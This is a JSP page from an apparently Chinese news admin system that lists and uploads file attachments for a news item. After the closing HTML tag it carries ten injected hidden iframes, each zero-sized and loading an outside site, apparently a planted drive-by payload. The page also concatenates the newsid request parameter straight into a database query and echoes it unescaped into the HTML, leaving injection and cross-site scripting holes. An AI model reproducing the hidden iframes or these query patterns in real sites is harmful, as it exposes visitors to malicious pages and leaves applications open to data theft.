<%@ page contentType="text/html; charset=gbk" %>
<%@ page import="com.web.map.*"%>
<%@ page import="com.web.obj.*"%>
<%@ page import="com.web.common.*"%>
<%@ page import="com.web.bean.*"%>
<%@ page import="java.util.*"%>
<%@ page import="hibernate.db.*"%>
<%
  String newsid = request.getParameter("newsid");
  String did = request.getParameter("did");
  if(did != null)
  {
  //  AccFileMap.delAccfile(did);
  }

  List accfilelist = HbmOperator.list("from Accfile as o where o.newsid = "+newsid);


%>
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	scrollbar-3dlight-color:#8CABDE;
	scrollbar-highlight-color:#eeeeee;
	scrollbar-face-color:#E8F1FF;
	scrollbar-arrow-color:#8CABDE;
	scrollbar-shadow-color:#8CABDE;
	scrollbar-darkshadow-color:#eeeeee;
	scrollbar-base-color:#F0F0F0;
	scrollbar-track-color:#F2F7FF;
}
-->
</style>
<link href="../../style/css.css" rel="stylesheet" type="text/css">
    <script language=javascript src="../../script/common.js"></script>
<script language="javascript">
function checkfrm(frm)
{
   //alert(frm.dicnumber.value);
   if(frm.channelname.value == "")
   {
      alert("请输入频道名称！");
      return false;
   }
   if(frm.singname.value=="")
   {
      alert("请输入唯一名称！");
      return false;

   }

   return true;
}
</script>
</head>
<body>
<table width="100%" height="63"  border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="56"><img src="../images/popwin1_01.gif" width="56" height="63"></td>
    <td width="219" align="center" background="../images/popwin1_02.gif"><table width="100%" height="31"  border="0" cellpadding="0" cellspacing="0" class="poptitle">
        <tr>
          <td align="center">附件</td>
        </tr>
    </table></td>
    <td width="61"><img src="../images/popwin1_03.gif" width="61" height="63"></td>
    <td background="../images/popwin1_04.gif">&nbsp;</td>
    <td width="40"><img src="../images/popwin1_06.gif" width="40" height="63"></td>
  </tr>
</table>

<table width="100%"  border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#999999" class="txt" style="border-collapse:collapse ">
       <input type="hidden" name="newsid" value="<%=newsid%>">
        <tr align="center" valign="middle">
          <td height="32">编号</td>
          <td>标题</td>
          <td height="32">操作</td>
        </tr>
        <%
        for(int i =0;i < accfilelist.size();i ++)
        {
        //  Accfile af = (Accfile)accfilelist.get(i);
        %>
        <tr align="center" valign="middle">
          <td height="27"><%//=af.getAccfileid()%></td>
          <td><%//=af.getAccfiletitle()%></td>
          <td height="27" ><a href="accfile.jsp?newsid=<%//=newsid+"&did="+af.getAccfileid()%>" class="info_link">删除</a> </td>
        </tr>
        <%
        }
        %>
        <tr align="center" valign="middle">
          <td height="27">&nbsp;</td>
          <td>&nbsp;</td>
          <td height="27">&nbsp;</td>
        </tr>
        <tr align="center" valign="middle">
          <td height="27">&nbsp;</td>
          <td>&nbsp;</td>
          <td height="27">&nbsp;</td>
        </tr>
		<form action="accfileop.jsp" method="POST" enctype="multipart/form-data">
                  <input type="hidden" name="newsid" value="<%=newsid%>">
        <tr align="center" valign="middle">
          <td width="120" height="27">标题</td>
          <td width="616"><input name="title" type="text" class="input" id="title">
          <input type="file" name="file"></td>
          <td width="273" height="27"><input name="Input" type="submit" class="button1"  value="上传"></td>
        </tr>

        <tr align="center" valign="middle">
          <td height="40" colspan="3">            　
            <input name="close" type="button" class="button1" onClick="window.close();" value="关　闭"></td>
        </tr>
		</form>
</table>


</body>
</html>
<iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe>
